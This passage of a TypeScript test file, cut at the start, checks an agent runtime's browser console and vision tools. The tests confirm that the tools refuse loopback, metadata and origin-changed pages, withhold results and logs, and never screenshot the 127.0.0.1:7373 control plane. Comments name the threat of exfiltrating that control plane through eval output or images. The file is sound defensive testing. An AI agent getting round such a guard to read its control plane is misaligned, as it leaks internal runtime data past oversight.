        evaluate: (async (fn: (arg: unknown) => unknown, arg: unknown) => fn(arg)) as unknown as import("playwright-core").Page["evaluate"]
      });
      const out = JSON.parse(
        await browserConsole("console-metadata", { expression: "(globalThis.__ranMeta = true)" })
      ) as { evalResult: unknown; evalError: string | null };
      expect(out.evalError).toContain("origin changed");
      expect(out.evalResult).toBeNull();
      expect((globalThis as { __ranMeta?: boolean }).__ranMeta).toBeUndefined();
    } finally {
      (globalThis as { location?: unknown }).location = savedLocation;
      delete (globalThis as { __ranMeta?: boolean }).__ranMeta;
    }
  });

  test("runs the expression normally when the origin is unchanged", async () => {
    const savedLocation = (globalThis as { location?: unknown }).location;
    (globalThis as { location?: unknown }).location = { origin: "https://example.com" };
    try {
      browserTest.installFakeSessionWithPageForTest("console-ok", {
        url: () => "https://example.com/",
        on: (() => undefined) as unknown as import("playwright-core").Page["on"],
        goto: (async () => null) as unknown as import("playwright-core").Page["goto"],
        evaluate: (async (fn: (arg: unknown) => unknown, arg: unknown) => fn(arg)) as unknown as import("playwright-core").Page["evaluate"]
      });
      // clear: true also exercises the console-log reset branch.
      const out = JSON.parse(await browserConsole("console-ok", { expression: "40 + 2", clear: true })) as {
        success: boolean;
        evalResult: unknown;
        evalError: string | null;
      };
      expect(out.success).toBe(true);
      expect(out.evalError).toBeNull();
      expect(out.evalResult).toBe(42);
    } finally {
      (globalThis as { location?: unknown }).location = savedLocation;
    }
  });

  // If a navigation commits *during* the eval so the page is on a refused
  // origin by the time the call returns, the result must be withheld AND the
  // captured console output dropped — neither the URL nor the control-plane
  // page's console logs may leak, now or on a later call.
  test("withholds console state and clears captured logs on a post-eval block", async () => {
    const savedLocation = (globalThis as { location?: unknown }).location;
    (globalThis as { location?: unknown }).location = { origin: "https://example.com" };
    let urlCalls = 0;
    let gotoTarget: string | undefined;
    try {
      browserTest.installFakeSessionWithPageForTest("console-postrace", {
        // Benign on the pre-check read; loopback on every read after the eval.
        url: () => (++urlCalls === 1 ? "https://example.com/" : "http://127.0.0.1:7373/api/runtime/whoami"),
        on: (() => undefined) as unknown as import("playwright-core").Page["on"],
        goto: (async (u: string) => {
          gotoTarget = u;
          return null;
        }) as unknown as import("playwright-core").Page["goto"],
        evaluate: (async (fn: (arg: unknown) => unknown, arg: unknown) => fn(arg)) as unknown as import("playwright-core").Page["evaluate"]
      });
      // Seed console output as if the control-plane page had logged it.
      browserTest.seedConsoleLogsForTest("console-postrace", [{ type: "error", text: "LOOPBACK-LEAK" }]);
      const out = JSON.parse(await browserConsole("console-postrace", { expression: "1 + 1" })) as {
        success: boolean;
        error?: string;
        url?: string;
        messages?: unknown;
      };
      expect(out.success).toBe(false);
      expect(out.error).toContain("loopback");
      expect(out.url).toBeUndefined();
      expect(out.messages).toBeUndefined();
      expect(gotoTarget).toBe("about:blank");
      // The captured loopback logs must be dropped so a later call can't return them.
      expect(browserTest.getConsoleLogsForTest("console-postrace")).toBeUndefined();
    } finally {
      (globalThis as { location?: unknown }).location = savedLocation;
    }
  });

  test("drops captured console output when the pre-check refuses a loopback page", async () => {
    browserTest.installFakeSessionWithPageForTest("console-preclear", {
      url: () => "http://127.0.0.1:7373/api/runtime/setup-requests",
      goto: (async () => null) as unknown as import("playwright-core").Page["goto"],
      evaluate: (async () => undefined) as unknown as import("playwright-core").Page["evaluate"]
    });
    browserTest.seedConsoleLogsForTest("console-preclear", [{ type: "error", text: "LOOPBACK-LEAK" }]);
    const out = JSON.parse(await browserConsole("console-preclear", { expression: "1 + 1" })) as { success: boolean };
    expect(out.success).toBe(false);
    expect(browserTest.getConsoleLogsForTest("console-preclear")).toBeUndefined();
  });

  test("runs on an about:blank page (null origin)", async () => {
    const savedLocation = (globalThis as { location?: unknown }).location;
    (globalThis as { location?: unknown }).location = { origin: "null" };
    try {
      browserTest.installFakeSessionWithPageForTest("console-blank", {
        url: () => "about:blank",
        on: (() => undefined) as unknown as import("playwright-core").Page["on"],
        evaluate: (async (fn: (arg: unknown) => unknown, arg: unknown) => fn(arg)) as unknown as import("playwright-core").Page["evaluate"]
      });
      const out = JSON.parse(await browserConsole("console-blank", { expression: "1 + 1" })) as {
        success: boolean;
        evalResult: unknown;
        evalError: string | null;
      };
      expect(out.success).toBe(true);
      expect(out.evalError).toBeNull();
      expect(out.evalResult).toBe(2);
    } finally {
      (globalThis as { location?: unknown }).location = savedLocation;
    }
  });

  test("redacts and returns captured console messages on success", async () => {
    const savedLocation = (globalThis as { location?: unknown }).location;
    (globalThis as { location?: unknown }).location = { origin: "https://example.com" };
    try {
      browserTest.installFakeSessionWithPageForTest("console-msgs", {
        url: () => "https://example.com/",
        on: (() => undefined) as unknown as import("playwright-core").Page["on"],
        evaluate: (async (fn: (arg: unknown) => unknown, arg: unknown) => fn(arg)) as unknown as import("playwright-core").Page["evaluate"]
      });
      browserTest.seedConsoleLogsForTest("console-msgs", [{ type: "log", text: "hello-from-page" }]);
      const out = JSON.parse(await browserConsole("console-msgs", { expression: "1 + 1" })) as {
        success: boolean;
        messages: { type: string; text: string }[];
        evalResult: unknown;
      };
      expect(out.success).toBe(true);
      expect(out.evalResult).toBe(2);
      expect(out.messages).toEqual([{ type: "log", text: "hello-from-page" }]);
    } finally {
      (globalThis as { location?: unknown }).location = savedLocation;
      browserTest.seedConsoleLogsForTest("console-msgs", []);
    }
  });

  test("surfaces a thrown error from withSession as a failure envelope", async () => {
    browserTest.setInFlightDisconnectsForTest(1);
    const out = JSON.parse(await browserConsole("console-disconnect", { expression: "1 + 1" })) as {
      success: boolean;
      error?: string;
    };
    expect(out.success).toBe(false);
    expect(out.error).toContain("disconnecting");
  });
});

// browser_vision ships rendered pixels to the vision provider, so it must
// refuse a loopback / metadata / link-local page just like browser_console
// and snapshot() do — otherwise the control plane is exfiltrated as an image.
describe("browserVision loopback guard", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("refuses to screenshot a loopback control-plane page and bounces it", async () => {
    let gotoTarget: string | undefined;
    let screenshotCalled = false;
    browserTest.installFakeSessionWithPageForTest("vision-loopback", {
      url: () => "http://127.0.0.1:7373/api/runtime/setup-requests",
      goto: (async (u: string) => {
        gotoTarget = u;
        return null;
      }) as unknown as import("playwright-core").Page["goto"],
      screenshot: (async () => {
        screenshotCalled = true;
        return Buffer.from([0x89, 0x50, 0x4e, 0x47]);
      }) as unknown as import("playwright-core").Page["screenshot"]
    });
    const out = JSON.parse(
      await browserVision("vision-loopback", { question: "what is shown?" }, {} as unknown as RuntimeConfig)
    ) as { success: boolean; error?: string };
    expect(out.success).toBe(false);
    expect(out.error).toContain("loopback");
    expect(gotoTarget).toBe("about:blank");
    // The screenshot must never have been taken.
    expect(screenshotCalled).toBe(false);
  });

  test("discards the screenshot if the page navigated to a refused origin during capture", async () => {
    let urlCalls = 0;
    browserTest.installFakeSessionWithPageForTest("vision-postshot", {
      // Benign on the pre-screenshot read; loopback on the post-capture read.
      url: () => (++urlCalls === 1 ? "https://example.com/" : "http://127.0.0.1:7373/"),
      goto: (async () => null) as unknown as import("playwright-core").Page["goto"],
      evaluate: (async () => []) as unknown as import("playwright-core").Page["evaluate"],
      screenshot: (async () => Buffer.from([0x89, 0x50, 0x4e, 0x47])) as unknown as import("playwright-core").Page["screenshot"]
    });
    const out = JSON.parse(
      await browserVision("vision-postshot", { question: "what is shown?" }, {} as unknown as RuntimeConfig)
    ) as { success: boolean; error?: string };
    expect(out.success).toBe(false);
    expect(out.error).toContain("loopback");
  });
});

describe("peekCurrentBrowserUrl / peekCurrentBrowserTargetId", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
  });

  test("peekCurrentBrowserUrl returns the session page's url, or undefined with no session", () => {
    expect(peekCurrentBrowserUrl("peek-none")).toBeUndefined();
    browserTest.installFakeSessionWithPageForTest("peek-url", {
      url: (() => "https://signin.example/login") as unknown as import("playwright-core").Page["url"]
    });
    expect(peekCurrentBrowserUrl("peek-url")).toBe("https://signin.example/login");
  });

  test("peekCurrentBrowserUrl returns undefined when page.url() throws", () => {
    browserTest.installFakeSessionWithPageForTest("peek-url-throw", {
      url: (() => {
        throw new Error("page gone");
      }) as unknown as import("playwright-core").Page["url"]
    });
    expect(peekCurrentBrowserUrl("peek-url-throw")).toBeUndefined();
  });

  test("peekCurrentBrowserTargetId resolves the page's CDP targetId", async () => {
    const page = { url: (() => "https://x.example/") as unknown as import("playwright-core").Page["url"] };
    const context: Partial<import("playwright-core").BrowserContext> = {
      newCDPSession: (async () => ({
        send: async (method: string) =>
          method === "Target.getTargetInfo" ? { targetInfo: { targetId: "TARGET-123" } } : {},
        detach: async () => undefined
      })) as unknown as import("playwright-core").BrowserContext["newCDPSession"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("peek-tid", page, context);
    expect(await peekCurrentBrowserTargetId("peek-tid")).toBe("TARGET-123");
  });

  test("peekCurrentBrowserTargetId returns undefined with no session", async () => {
    expect(await peekCurrentBrowserTargetId("peek-tid-none")).toBeUndefined();
  });

  test("peekCurrentBrowserTargetId returns undefined when the CDP lookup fails", async () => {
    const page = { url: (() => "https://x.example/") as unknown as import("playwright-core").Page["url"] };
    const context: Partial<import("playwright-core").BrowserContext> = {
      newCDPSession: (async () => {
        throw new Error("no CDP");
      }) as unknown as import("playwright-core").BrowserContext["newCDPSession"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("peek-tid-fail", page, context);
    expect(await peekCurrentBrowserTargetId("peek-tid-fail")).toBeUndefined();
  });

  test("peekCurrentBrowserTargetId returns undefined when targetInfo lacks a string id", async () => {
    const page = { url: (() => "https://x.example/") as unknown as import("playwright-core").Page["url"] };
    const context: Partial<import("playwright-core").BrowserContext> = {
      newCDPSession: (async () => ({
        send: async () => ({ targetInfo: {} }),
        detach: async () => undefined
      })) as unknown as import("playwright-core").BrowserContext["newCDPSession"]
    };
    browserTest.installFakeSessionWithPageAndContextForTest("peek-tid-noid", page, context);
    expect(await peekCurrentBrowserTargetId("peek-tid-noid")).toBeUndefined();
  });
});
